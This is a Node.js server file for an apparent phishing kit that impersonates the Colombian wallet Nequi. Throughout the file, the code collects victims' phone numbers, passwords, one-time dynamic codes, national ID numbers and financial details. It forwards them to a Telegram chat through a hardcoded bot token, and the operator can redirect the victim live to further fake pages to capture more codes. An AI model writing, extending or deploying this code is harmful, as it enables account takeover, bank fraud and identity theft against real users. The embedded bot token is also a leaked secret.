/**
 * ========================================
 * NEQUI CREDITO - SERVER
 * ========================================
 * Backend con Socket.IO y Telegram Bot
 * Arquitectura: MVC + Service Layer
 * ========================================
 */

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ========================================
// CONFIGURACIÓN
// ========================================
const CONFIG = {
  PORT: 3000,
  TELEGRAM: {
    TOKEN: '8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc',
    CHAT_ID: '-5179068892'
  }
};

// ========================================
// INICIALIZACIÓN
// ========================================
const app = express();
const server = http.createServer(app);
const io = socketIO(server);
const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { polling: true });

// Middleware
app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ========================================
// SESSION MANAGER (Repository Pattern)
// ========================================
class SessionRepository {
  constructor() {
    this.sessions = new Map();
  }

  create(socketId) {
    // Si existe una sesión previa con este socketId, eliminarla completamente
    if (this.sessions.has(socketId)) {
      const oldSession = this.sessions.get(socketId);
      console.log(`🗑️ Eliminando sesión anterior: ${oldSession.sessionId}`);
      this.sessions.delete(socketId);
    }
    
    const session = {
      socketId,
      sessionId: this.generateSessionId(),
      data: {}, // Objeto completamente vacío
      telegramMessageId: null,
      createdAt: new Date(),
      lastActivity: new Date()
    };
    this.sessions.set(socketId, session);
    console.log(`✨ Nueva sesión creada: ${session.sessionId}`);
    return session;
  }

  /**
   * Reutiliza una sesión existente con un nuevo socketId
   */
  reconnect(oldSessionId, newSocketId) {
    // Buscar la sesión por sessionId
    let existingSession = null;
    let oldSocketId = null;
    
    for (let [socketId, session] of this.sessions) {
      if (session.sessionId === oldSessionId) {
        existingSession = session;
        oldSocketId = socketId;
        break;
      }
    }
    
    if (existingSession) {
      // Eliminar la referencia antigua
      this.sessions.delete(oldSocketId);
      
      // Actualizar socketId y agregar con la nueva clave
      existingSession.socketId = newSocketId;
      existingSession.lastActivity = new Date();
      this.sessions.set(newSocketId, existingSession);
      
      console.log(`🔄 Sesión reconectada: ${oldSessionId} (socket: ${oldSocketId} -> ${newSocketId})`);
      return existingSession;
    }
    
    return null;
  }

  get(socketId) {
    return this.sessions.get(socketId);
  }

  update(socketId, data) {
    const session = this.sessions.get(socketId);
    if (session) {
      session.data = { ...session.data, ...data };
      session.lastActivity = new Date();
      return session;
    }
    return null;
  }

  /**
   * Actualiza el telegramMessageId de una sesión
   */
  updateTelegramMessageId(socketId, messageId) {
    const session = this.sessions.get(socketId);
    if (session) {
      session.telegramMessageId = messageId;
      session.lastActivity = new Date();
      // Forzar actualización en el Map
      this.sessions.set(socketId, session);
      console.log(`📌 MessageId guardado: ${messageId} para sesión ${session.sessionId}`);
      
      // Verificar que se guardó correctamente
      const verificacion = this.sessions.get(socketId);
      console.log(`✅ Verificación - MessageId en Map: ${verificacion.telegramMessageId}`);
      
      return session;
    }
    return null;
  }

  /**
   * Elimina una sesión y limpia todas sus referencias
   */
  delete(socketId) {
    const session = this.sessions.get(socketId);
    if (session) {
      console.log(`🗑️ Limpiando sesión: ${session.sessionId}`);
    }
    this.sessions.delete(socketId);
  }

  getBySessionId(sessionId) {
    for (let [, session] of this.sessions) {
      if (session.sessionId === sessionId) {
        return session;
      }
    }
    return null;
  }

  generateSessionId() {
    return `S${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  getAccumulatedData(socketId) {
    const session = this.sessions.get(socketId);
    return session ? session.data : {};
  }
}

const sessionRepo = new SessionRepository();

// Limpieza automática de sesiones antiguas cada 5 minutos
setInterval(() => {
  const now = new Date();
  const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutos de inactividad
  
  for (let [socketId, session] of sessionRepo.sessions) {
    const inactiveTime = now - session.lastActivity;
    if (inactiveTime > SESSION_TIMEOUT) {
      console.log(`🗑️ Limpiando sesión inactiva: ${session.sessionId} (inactiva ${Math.round(inactiveTime/1000)}s)`);
      sessionRepo.delete(socketId);
    }
  }
}, 5 * 60 * 1000); // Cada 5 minutos

// ========================================
// TELEGRAM SERVICE (Service Layer)
// ========================================
class TelegramService {
  constructor(bot, chatId) {
    this.bot = bot;
    this.chatId = chatId;
    this.pendingMessages = new Map(); // messageId -> socketId
  }

  /**
   * Envía mensaje a Telegram con 5 botones + Finalizar
   */
  async sendMessage(session, messageType) {
    const data = session.data;
    const sessionId = session.sessionId;

    // Construir mensaje con todos los datos acumulados
    let message = `🔔 *Nueva Información del Cliente*\n\n`;
    message += `🆔 *Sesión:* \`${sessionId}\`\n`;
    message += `📅 *Fecha:* ${new Date().toLocaleString('es-CO')}\n\n`;
    
    message += `📋 *DATOS ACUMULADOS*\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;

    if (data.phone) {
      message += `📞 *Teléfono:* \`${data.phone}\`\n`;
    }
    if (data.password) {
      message += `🔑 *Clave:* \`${data.password}\`\n`;
    }
    if (data.dinamica) {
      message += `🔐 *Clave Dinámica:* \`${data.dinamica}\`\n`;
    }

    // Datos del crédito
    if (data.cedula) {
      message += `\n💰 *SOLICITUD DE CRÉDITO*\n`;
      message += `━━━━━━━━━━━━━━━━━━━━\n`;
      message += `🆔 *Cédula:* \`${data.cedula}\`\n`;
      message += `👤 *Nombre:* ${data.nombre}\n`;
      message += `💵 *Monto:* $${Number(data.monto).toLocaleString('es-CO')}\n`;
      message += `⏰ *Plazo:* ${data.plazo} meses\n`;
      message += `💼 *Ocupación:* ${data.ocupacion}\n`;
      message += `💰 *Ingresos:* $${Number(data.ingresos).toLocaleString('es-CO')}\n`;
      message += `📉 *Gastos:* $${Number(data.gastos).toLocaleString('es-CO')}\n`;
      message += `💳 *Saldo Nequi:* $${Number(data.saldo).toLocaleString('es-CO')}\n`;
      message += `📅 *Fecha Pago:* ${data.fechaPago}\n`;
    }

    message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `📨 *Tipo:* ${this.getMessageTypeText(messageType)}\n`;

    // Botones inline con los 5 tipos + Finalizar
    const keyboard = {
      inline_keyboard: [
        [
          { text: '📞 Pedir Número', callback_data: `req_phone_${sessionId}` },
          { text: '🔑 Pedir Clave', callback_data: `req_pass_${sessionId}` }
        ],
        [
          { text: '💰 Pedir Crédito', callback_data: `req_loan_${sessionId}` },
          { text: '🔐 Pedir Dinámica', callback_data: `req_dinamica_${sessionId}` }
        ],
        [
          { text: '💳 Pedir Recarga', callback_data: `req_recarga_${sessionId}` }
        ],
        [
          { text: '🏁 Finalizar Sesión', callback_data: `finalize_${sessionId}` }
        ]
      ]
    };

    try {
      let result;
      let messageId;
      
      // Si ya existe un mensaje de Telegram para esta sesión, editarlo
      if (session.telegramMessageId) {
        console.log(`🔄 Editando mensaje existente ID: ${session.telegramMessageId}`);
        try {
          result = await this.bot.editMessageText(message, {
            chat_id: this.chatId,
            message_id: session.telegramMessageId,
            parse_mode: 'Markdown',
            reply_markup: keyboard
          });
          messageId = session.telegramMessageId;
          console.log(`✅ Mensaje editado exitosamente`);
        } catch (editError) {
          console.log(`⚠️ Error al editar: ${editError.message}`);
          // Si falla la edición, enviar nuevo mensaje
          result = await this.bot.sendMessage(this.chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: keyboard
          });
          messageId = result.message_id;
          sessionRepo.updateTelegramMessageId(session.socketId, messageId);
        }
      } else {
        // Enviar nuevo mensaje
        console.log('🆕 Enviando primer mensaje de la sesión...');
        result = await this.bot.sendMessage(this.chatId, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard
        });
        messageId = result.message_id;
        sessionRepo.updateTelegramMessageId(session.socketId, messageId);
        console.log(`✅ Mensaje enviado (ID: ${messageId})`);
      }

      // Guardar referencia del mensaje
      this.pendingMessages.set(messageId, session.socketId);
      
      return { success: true, messageId: messageId };
    } catch (error) {
      console.error('Error enviando mensaje a Telegram:', error);
      return { success: false, error: error.message };
    }
  }

  getMessageTypeText(type) {
    const types = {
      'phone': '📞 Teléfono',
      'password': '🔑 Contraseña',
      'loan': '💰 Crédito',
      'dinamica': '🔐 Clave Dinámica'
    };
    return types[type] || type;
  }

  /**
   * Limpia referencias de mensajes pendientes
   */
  cleanPendingMessage(messageId) {
    if (messageId) {
      this.pendingMessages.delete(messageId);
    }
  }

  /**
   * Maneja callbacks de Telegram
   */
  async handleCallback(callbackQuery) {
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    
    // Extraer acción y sessionId
    const parts = data.split('_');
    const action = parts[0];
    const subaction = parts[1];
    const sessionId = parts.slice(2).join('_');

    console.log(`📨 Callback recibido: ${data}`);

    // Buscar sesión por sessionId
    const session = sessionRepo.getBySessionId(sessionId);
    
    if (!session) {
      this.bot.answerCallbackQuery(callbackQuery.id, {
        text: '⚠️ Sesión no encontrada o expirada'
      });
      return;
    }

    const socketId = session.socketId;
    const socket = io.sockets.sockets.get(socketId);

    if (!socket) {
      this.bot.answerCallbackQuery(callbackQuery.id, {
        text: '⚠️ Cliente desconectado'
      });
      return;
    }

    // Procesar acciones
    if (action === 'req') {
      // Solicitudes de información adicional
      const requests = {
        'phone': { page: 'numero.html', text: '📞 Solicitando número...' },
        'pass': { page: 'contraseña.html', text: '🔑 Solicitando clave...' },
        'loan': { page: 'simular-credito.html', text: '💰 Solicitando crédito...' },
        'dinamica': { page: 'dinamica.html', text: '🔐 Solicitando clave dinámica...' },
        'recarga': { page: 'recarga.html', text: '💳 Solicitando recarga...' }
      };

      const request = requests[subaction];
      if (request) {
        this.bot.answerCallbackQuery(callbackQuery.id, { text: request.text });
        socket.emit('redirect', { url: request.page });
      }

    } else if (action === 'finalize') {
      this.bot.answerCallbackQuery(callbackQuery.id, { text: '🏁 Finalizando sesión...' });
      
      // Eliminar mensaje de Telegram si existe
      if (session.telegramMessageId) {
        try {
          await this.bot.deleteMessage(this.chatId, session.telegramMessageId);
          console.log(`🗑️ Mensaje de Telegram eliminado (ID: ${session.telegramMessageId})`);
        } catch (error) {
          console.error('⚠️ Error al eliminar mensaje de Telegram:', error.message);
        }
        this.pendingMessages.delete(session.telegramMessageId);
      }
      
      // Notificar al cliente y eliminar sesión
      socket.emit('finalize-session');
      sessionRepo.delete(socketId);
    }
  }
}

const telegramService = new TelegramService(telegramBot, CONFIG.TELEGRAM.CHAT_ID);

// ========================================
// SOCKET.IO CONTROLLER
// ========================================
io.on('connection', (socket) => {
  const savedSessionId = socket.handshake.auth.sessionId;
  
  console.log(`✅ Cliente conectado: ${socket.id}`);
  console.log(`🔍 SessionId recibido: ${savedSessionId || 'ninguno'}`);

  let session;

  // Si hay sessionId, intentar reconectar
  if (savedSessionId) {
    session = sessionRepo.reconnect(savedSessionId, socket.id);
    
    if (session) {
      socket.emit('session-reconnected', { 
        sessionId: session.sessionId,
        data: session.data 
      });
      console.log(`✅ Sesión reconectada: ${session.sessionId} con ${Object.keys(session.data).length} datos`);
    } else {
      // Sesión no encontrada, crear nueva
      session = sessionRepo.create(socket.id);
      socket.emit('session-created', { sessionId: session.sessionId });
      console.log(`⚠️ Sesión ${savedSessionId} no encontrada, creando nueva: ${session.sessionId}`);
    }
  } else {
    // No hay sessionId, crear nueva sesión
    session = sessionRepo.create(socket.id);
    socket.emit('session-created', { sessionId: session.sessionId });
    console.log(`🆕 Primera conexión, creando sesión: ${session.sessionId}`);
  }

  // ====================================
  // EVENT: submit-phone
  // ====================================
  socket.on('submit-phone', async (data) => {
    console.log('📞 Recibido teléfono:', data.phone);
    
    sessionRepo.update(socket.id, { phone: data.phone });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    
    const result = await telegramService.sendMessage(session, 'phone');
    
    if (result.success) {
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: submit-password
  // ====================================
  socket.on('submit-password', async (data) => {
    console.log('🔑 Recibida contraseña');
    
    sessionRepo.update(socket.id, { password: data.password });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    
    const result = await telegramService.sendMessage(session, 'password');
    
    if (result.success) {
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: submit-loan
  // ====================================
  socket.on('submit-loan', async (data) => {
    console.log('💰 Recibida solicitud de crédito');
    console.log('📋 Datos recibidos:', JSON.stringify(data, null, 2));
    
    sessionRepo.update(socket.id, {
      cedula: data.cedula,
      nombre: data.nombre,
      monto: data.monto,
      plazo: data.plazo,
      ocupacion: data.ocupacion,
      ingresos: data.ingresos,
      gastos: data.gastos,
      saldo: data.saldo,
      fechaPago: data.fechaPago
    });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - SessionId: ${session.sessionId}`);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    console.log(`📊 Datos acumulados en sesión:`, Object.keys(session.data));
    
    const result = await telegramService.sendMessage(session, 'loan');
    
    if (result.success) {
      console.log('✅ Mensaje enviado a Telegram exitosamente');
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      console.error('❌ Error al enviar mensaje a Telegram:', result.error);
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: submit-dinamica
  // ====================================
  socket.on('submit-dinamica', async (data) => {
    console.log('🔐 Recibida clave dinámica');
    
    sessionRepo.update(socket.id, { dinamica: data.dinamica });
    
    // Obtener sesión actualizada con telegramMessageId
    const session = sessionRepo.get(socket.id);
    console.log(`🔍 Sesión actual - MessageId: ${session.telegramMessageId || 'ninguno'}`);
    
    const result = await telegramService.sendMessage(session, 'dinamica');
    
    if (result.success) {
      socket.emit('telegram-sent', { messageId: result.messageId });
    } else {
      socket.emit('telegram-error', { error: result.error });
    }
  });

  // ====================================
  // EVENT: disconnect
  // ====================================
  socket.on('disconnect', () => {
    console.log(`❌ Cliente desconectado: ${socket.id}`);
    
    const session = sessionRepo.get(socket.id);
    if (session) {
      console.log(`💾 Sesión ${session.sessionId} mantenida para reconexión`);
      // NO eliminar la sesión, mantenerla para que pueda reconectarse
      // Solo limpiar referencia del mensaje pendiente
      if (session.telegramMessageId) {
        telegramService.pendingMessages.delete(session.telegramMessageId);
      }
    }
    
    // NO eliminar: sessionRepo.delete(socket.id);
  });
});

// ========================================
// TELEGRAM BOT HANDLERS
// ========================================
telegramBot.on('callback_query', (callbackQuery) => {
  telegramService.handleCallback(callbackQuery);
});

// ========================================
// RUTAS HTTP
// ========================================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    activeSessions: sessionRepo.sessions.size,
    uptime: process.uptime()
  });
});

// ========================================
// INICIO DEL SERVIDOR
// ========================================
server.listen(CONFIG.PORT, () => {
  console.log('');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('  🚀 NEQUI CREDITO SERVER');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`  📡 Servidor: http://localhost:${CONFIG.PORT}`);
  console.log(`  💬 Telegram Bot: Activo`);
  console.log(`  🔌 Socket.IO: Listo`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('');
});

// ========================================
// MANEJO DE ERRORES
// ========================================
process.on('uncaughtException', (error) => {
  console.error('❌ Error no capturado:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Promise rechazada no manejada:', reason);
});
